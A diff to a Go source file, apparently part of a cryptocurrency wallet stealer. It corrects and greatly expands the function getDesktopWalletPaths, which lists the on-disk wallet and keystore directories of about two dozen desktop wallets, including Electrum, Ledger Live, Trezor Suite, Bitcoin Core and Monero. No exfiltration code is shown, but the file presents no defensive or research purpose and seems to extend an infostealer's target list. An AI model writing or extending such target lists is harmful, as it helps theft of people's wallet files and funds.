@@ -11,9 +11,24 @@ func getDesktopWalletPaths() []walletConfig {
 	return []walletConfig{
 		{"Atomic", "atomic/Local Storage/leveldb", "appdata"},
 		{"Exodus", "Exodus/exodus.wallet", "appdata"},
-		{"Electrum", "Electrum/wallets", "home_dot"},
-		{"Ethereum", "Ethereum/keystore", "home_dot"},
+		{"Electrum", ".electrum/wallets", "home"},
+		{"Electrum-LTC", ".electrum-ltc/wallets", "home"},
+		{"Ethereum", ".ethereum/keystore", "home"},
 		{"Coinomi", "Coinomi/wallets", "appdata"},
+		{"Ledger Live", "Ledger Live", "appdata"},
+		{"Trezor Suite", "@trezor/suite-desktop", "appdata"},
+		{"Wasabi", "WalletWasabi/Client/Wallets", "appdata"},
+		{"Daedalus", "Daedalus Mainnet", "appdata"},
+		{"Sparrow", "Sparrow", "appdata"},
+		{"Blockstream Green", "Blockstream Green", "appdata"},
+		{"Bitcoin Core", "Bitcoin", "appdata"},
+		{"Guarda", "Guarda", "appdata"},
+		{"Jaxx Liberty", "com.liberty.jaxx", "appdata"},
+		{"Binance", "Binance", "appdata"},
+		{"Monero", "Documents/Monero/wallets", "home"},
+		{"Feather", ".feather/wallets", "home"},
+		{"Litecoin Core", "Litecoin", "appdata"},
+		{"Dogecoin Core", "Dogecoin", "appdata"},
 	}
 }
 
